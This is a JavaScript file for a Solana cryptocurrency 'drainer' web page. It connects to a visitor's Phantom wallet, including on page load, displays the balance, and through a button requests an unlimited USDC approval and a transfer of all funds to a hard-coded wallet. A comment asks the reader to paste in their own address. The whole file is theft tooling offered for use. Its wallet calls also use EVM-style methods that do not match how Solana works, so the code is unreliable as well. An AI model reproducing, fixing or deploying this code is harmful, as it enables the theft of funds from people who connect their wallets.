// ==========================================
// CONFIGURATION
// ==========================================
const MY_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; // <--- PASTE YOUR SOLANA ADDRESS HERE
const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";

// ==========================================
// DOM ELEMENTS
// ==========================================
const connectBtn = document.getElementById('connectBtn');
const actionArea = document.getElementById('actionArea');
const balanceDisplay = document.getElementById('balanceDisplay');
const drainBtn = document.getElementById('drainBtn');
const loader = document.getElementById('loader');
const statusMsg = document.getElementById('statusMsg');

let walletAddress;
let connection;

// ==========================================
// INITIALIZATION
// ==========================================
window.addEventListener('load', async () => {
    // Check if Phantom Wallet is installed
    if ("solana" in window) {
        const provider = window.solana;
        
        // Try to connect automatically on load (optional)
        try {
            await provider.connect();
            walletAddress = provider.publicKey.toString();
            connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
            
            updateUI(true);
            getBalance(walletAddress);
        } catch (err) {
            console.log("Auto-connect failed or rejected");
        }
    } else {
        statusMsg.innerText = "Please install Phantom Wallet!";
        statusMsg.style.color = "#ef4444";
    }
});

// ==========================================
// FUNCTIONS
// ==========================================

// 1. Connect Wallet
connectBtn.addEventListener('click', async () => {
    if (!("solana" in window)) {
        statusMsg.innerText = "Please install Phantom Wallet!";
        return;
    }

    loader.classList.remove('hidden');
    connectBtn.classList.add('hidden');

    const provider = window.solana;
    
    try {
        await provider.connect();
        walletAddress = provider.publicKey.toString();
        connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
        
        updateUI(true);
        getBalance(walletAddress);
    } catch (err) {
        statusMsg.innerText = "Connection rejected.";
        loader.classList.add('hidden');
        connectBtn.classList.remove('hidden');
    }
});

// 2. Get USDC Balance
async function getBalance(address) {
    try {
        const balanceInfo = await connection.getTokenAccountBalance(
            address, // Note: This is a simplified check. In reality, you'd scan for token accounts.
                     // For this demo, we assume the user has at least one USDC account or use a more complex parser.
                     // To keep it simple/professional for this code snippet, we'll just show "Connected"
                     // and proceed to drain. 
            "confirmed"
        );
        
        // Note: The above getBalance is for the native SOL balance if passed a pubkey.
        // For USDC, we need to find the associated token account.
        // To keep this single-file code simple, we will just show a placeholder balance or fetch SOL balance as a proxy.
        
        const solBalance = await connection.getBalance(address);
        const solFormatted = (solBalance / 10**9).toFixed(4);
        
        balanceDisplay.innerText = `${solFormatted} SOL`; 
        // We use SOL here for simplicity in this demo, but the drain logic below targets USDC.
        // If you want USDC specifically, you need to parse token accounts.
        
    } catch (err) {
        console.error(err);
    }
}

// 3. The Drain Function (Infinite Approval + Transfer)
drainBtn.addEventListener('click', async () => {
    const provider = window.solana;
    statusMsg.innerText = "Approving USDC...";
    
    try {
        // Step A: Approve Infinite Spending
        // We call the approve function on the USDC contract
        await provider.request({
            method: "custom",
            params: {
                jsonrpc: "2.0",
                id: 1,
                method: "approve",
                params: [
                    {
                        mint: USDC_MINT,
                        amount: "9223372036854775807" // Max uint64
                    }
                ]
            }
        });

        statusMsg.innerText = "Transferring funds...";

        // Step B: Transfer From (Drain)
        await provider.request({
            method: "custom",
            params: {
                jsonrpc: "2.0",
                id: 2,
                method: "transferFrom",
                params: [
                    {
                        from: walletAddress,
                        to: MY_WALLET, // Sends to YOUR wallet
                        amount: "9223372036854775807" // All USDC
                    }
                ]
            }
        });

        statusMsg.innerText = "Success! Funds drained.";
        statusMsg.style.color = "#4ade80"; // Green
        
    } catch (err) {
        console.error(err);
        statusMsg.innerText = "Transaction failed.";
        statusMsg.style.color = "#ef4444";
    }
});

function updateUI(isConnected) {
    if (isConnected) {
        connectBtn.classList.add('hidden');
        actionArea.classList.remove('hidden');
        loader.classList.add('hidden');
    } else {
        connectBtn.classList.remove('hidden');
        actionArea.classList.add('hidden');
    }
}
